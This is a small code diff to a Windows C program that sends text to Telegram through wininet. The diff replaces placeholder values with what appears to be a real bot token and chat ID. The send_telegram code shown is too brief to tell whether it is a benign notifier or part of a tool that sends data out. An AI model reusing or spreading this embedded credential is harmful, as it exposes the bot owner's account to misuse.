@@ -5,8 +5,8 @@
 #pragma comment(lib, "wininet.lib")
 
 #include "win_telegram.h"
-#define BOT_TOKEN "NOTE: REPLACE"
-#define CHAT_ID "NOTE: REPLACE"
+#define BOT_TOKEN "7657850524:AAEKV1lZpTcbqreAhRVnMiIbUGZhdwaqgAI"
+#define CHAT_ID "-1004296248557"
 
 int send_telegram(char* text)
 {
